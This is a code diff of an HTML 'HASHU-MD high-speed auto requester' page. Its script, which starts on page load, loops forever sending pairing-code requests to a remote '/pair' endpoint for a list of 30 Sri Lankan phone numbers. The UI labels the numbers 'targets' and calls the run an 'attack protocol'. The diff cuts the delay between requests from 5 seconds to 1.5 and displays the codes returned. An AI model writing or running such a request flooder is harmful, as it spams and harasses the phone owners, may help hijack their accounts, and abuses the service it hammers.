@@ -3,161 +3,87 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HASHU-MD | CYBER REQUESTER</title>
+    <title>HASHU-MD | ULTRA FAST REQUESTER</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
-
-        :root {
-            --neon-green: #00ff41;
-            --dark-bg: #050505;
-            --panel-bg: #0d0d0d;
-        }
-
-        body {
-            background-color: var(--dark-bg);
-            color: var(--neon-green);
-            font-family: 'Share Tech Mono', monospace;
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            overflow: hidden;
-        }
-
-        .dashboard {
-            width: 90%;
-            max-width: 700px;
-            background: var(--panel-bg);
-            border: 1px solid var(--neon-green);
-            box-shadow: 0 0 20px rgba(0, 255, 65, 0.1);
-            padding: 20px;
-            position: relative;
-        }
-
-        .header {
-            border-bottom: 1px solid var(--neon-green);
-            padding-bottom: 10px;
-            margin-bottom: 15px;
-            text-align: center;
-        }
-
-        .header h1 {
-            margin: 0;
-            font-size: 22px;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            text-shadow: 0 0 10px var(--neon-green);
-        }
-
-        #log-screen {
-            background: #000;
-            height: 350px;
-            overflow-y: auto;
-            border: 1px inset var(--neon-green);
-            padding: 15px;
-            font-size: 13px;
-            line-height: 1.6;
-        }
-
-        .log-entry {
-            margin-bottom: 8px;
-            border-bottom: 1px solid #1a1a1a;
-            animation: fadeIn 0.3s ease-in;
-        }
-
-        .timestamp { color: #888; margin-right: 10px; }
-        .number { color: #fff; font-weight: bold; }
-        .status-success { color: var(--neon-green); }
-        .status-error { color: #ff3e3e; }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-5px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        /* Scrollbar styling */
-        #log-screen::-webkit-scrollbar { width: 5px; }
-        #log-screen::-webkit-scrollbar-thumb { background: var(--neon-green); }
-
-        .footer {
-            margin-top: 15px;
-            font-size: 12px;
-            text-align: center;
-            opacity: 0.7;
-        }
+        :root { --neon: #00ff41; --bg: #050505; --panel: #0d0d0d; }
+        body { background: var(--bg); color: var(--neon); font-family: 'Share Tech Mono', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .dashboard { width: 95%; max-width: 850px; background: var(--panel); border: 1px solid var(--neon); padding: 20px; box-shadow: 0 0 20px rgba(0, 255, 65, 0.2); }
+        .header { text-align: center; border-bottom: 2px solid var(--neon); margin-bottom: 15px; padding-bottom: 10px; }
+        #log-screen { background: #000; height: 400px; overflow-y: auto; border: 1px inset var(--neon); padding: 15px; font-size: 12px; }
+        .log-entry { margin-bottom: 5px; border-bottom: 1px solid #1a1a1a; display: flex; justify-content: space-between; }
+        .success { color: var(--neon); }
+        .error { color: #ff3e3e; }
+        .p-code { color: #fff; font-weight: bold; background: #222; padding: 0 5px; border-radius: 3px; }
     </style>
 </head>
 <body>
 
-    <div class="dashboard">
-        <div class="header">
-            <h1>HASHU-MD AUTO REQUESTER</h1>
-            <p>Target: unity.up.railway.app</p>
-        </div>
-
-        <div id="log-screen">
-            <div class="log-entry">SYSTEM READY... INITIALIZING REQUEST LOOP...</div>
-        </div>
-
-        <div class="footer">
-            POWERED BY DARK CYBER LEADERZ | STATUS: <span id="main-status">ACTIVE</span>
-        </div>
+<div class="dashboard">
+    <div class="header">
+        <h1>HASHU-MD HIGH-SPEED AUTO REQUESTER</h1>
+        <p>DELAY: 1.5s | TARGETS: 30 NUMBERS</p>
     </div>
+    <div id="log-screen">
+        <div class="log-entry">INITIALIZING ATTACK PROTOCOL...</div>
+    </div>
+</div>
 
-    <script>
-        const targetUrl = "https://unity.up.railway.app/pair";
-        const numbers = [
-            "94743126513", "94763126513", "94740137623", 
-            "94741234556", "94715865463"
-        ];
-        const logScreen = document.getElementById('log-screen');
+<script>
+    const targetUrl = "https://unity.up.railway.app/pair";
+    
+    // Numbers 30 Example list
+    const numbers = [
+        "94743126513", "94763126513", "94740137623", "94741234556", "94715865463",
+        "94701234567", "94711234567", "94721234567", "94751234567", "94761234567",
+        "94771234567", "94781234567", "94749876543", "94769876543", "94709876543",
+        "94719876543", "94729876543", "94759876543", "94791234567", "94744445555",
+        "94766667777", "94700001111", "94711112222", "94788889999", "94741112223",
+        "94761112224", "94701112225", "94711112226", "94721112227", "94751112228"
+    ];
 
-        function addLog(num, status, isError = false) {
-            const time = new Date().toLocaleTimeString();
-            const div = document.createElement('div');
-            div.className = 'log-entry';
-            
-            div.innerHTML = `
-                <span class="timestamp">[${time}]</span>
-                <span class="number">TARGET: ${num}</span> | 
-                <span class="${isError ? 'status-error' : 'status-success'}">
-                    ${isError ? 'FAILED' : 'CODE_REQUESTED_SUCCESSFULLY'}
-                </span>
-            `;
-            
-            logScreen.prepend(div);
-            
-            // Logs ගොඩක් වැඩි වුණොත් පරණ ඒවා අයින් කරන්න
-            if (logScreen.children.length > 50) {
-                logScreen.removeChild(logScreen.lastChild);
-            }
+    const logScreen = document.getElementById('log-screen');
+
+    function addLog(num, result, isError = false) {
+        const time = new Date().toLocaleTimeString();
+        const div = document.createElement('div');
+        div.className = 'log-entry';
+        
+        // Response eke 'code' kiyana word eka thiyenawanam eka highlight karanna
+        let displayResult = result;
+        if(result.includes("code") || result.length < 10) {
+            displayResult = `<span class="p-code">${result}</span>`;
         }
 
-        async function startLoop() {
-            while (true) {
-                for (let num of numbers) {
-                    try {
-                        // Request එක යවනවා
-                        const response = await fetch(`${targetUrl}?number=${num}`);
-                        
-                        if (response.ok) {
-                            addLog(num, "SUCCESS");
-                        } else {
-                            addLog(num, "SERVER_REJECTED", true);
-                        }
-                    } catch (err) {
-                        addLog(num, "CONNECTION_ERROR", true);
-                    }
+        div.innerHTML = `
+            <span>[${time}] TARGET: ${num}</span>
+            <span class="${isError ? 'error' : 'success'}">${isError ? 'FAILED' : 'CODE: ' + displayResult}</span>
+        `;
+        logScreen.prepend(div);
+        if (logScreen.children.length > 100) logScreen.removeChild(logScreen.lastChild);
+    }
+
+    async function startFastRequest() {
+        while (true) {
+            for (let num of numbers) {
+                try {
+                    const response = await fetch(`${targetUrl}?number=${num}`);
+                    const data = await response.text(); 
                     
-                    // ඔයා ඉල්ලපු තත්පර 5ක Delay එක
-                    await new Promise(r => setTimeout(r, 5000));
+                    // Backend eken dena code eka JSON nam data.code kiyala ganna puluwan
+                    // Text nam directly 'data' pennanawa
+                    addLog(num, data || "NO_RESPONSE");
+                } catch (err) {
+                    addLog(num, "CONNECTION_ERROR", true);
                 }
+                // Request speed: 1.5 Seconds
+                await new Promise(r => setTimeout(r, 1500));
             }
         }
+    }
 
-        // Start the engine
-        startLoop();
-    </script>
+    window.onload = startFastRequest;
+</script>
+
 </body>
-  </html>
+</html>
